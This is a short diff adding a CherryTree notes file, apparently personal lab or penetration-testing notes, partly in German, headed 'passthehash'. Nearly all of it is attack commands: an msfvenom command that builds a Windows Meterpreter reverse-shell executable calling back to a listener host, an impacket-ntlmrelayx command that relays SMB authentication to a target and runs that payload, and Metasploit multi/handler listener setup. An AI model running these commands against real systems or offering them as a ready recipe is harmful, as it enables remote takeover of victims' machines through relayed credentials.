@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="67" master_id="0" name="passthehash" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1749161748" ts_lastsave="1749162520">
+    <rich_text>erstellen des payloads:
+
+
+target angreifen:
+
+
+Listener erstellen:
+
+	msfconsole
+	search exploit multi/handler
+	use 7 (w.e. number mutlihandler is)
+	PAYLOAD HAS TO MATCH OUR SHELL:
+	set payload windows</rich_text>
+    <rich_text foreground="#ff9d00" weight="heavy">/</rich_text>
+    <rich_text>meterpreter</rich_text>
+    <rich_text foreground="#ff9d00" weight="heavy">/</rich_text>
+    <rich_text>reverse_tcp
+	set lhost 
+	run
+
+visit thee fileshare -&gt; win</rich_text>
+    <codebox char_offset="24" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.94 LPORT=4444 -f exe -o /root/shell.exe</codebox>
+    <codebox char_offset="45" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-ntlmrelayx -smb2support -e /root/shell.exe -t 10.10.0.62</codebox>
+  </node>
+</cherrytree>
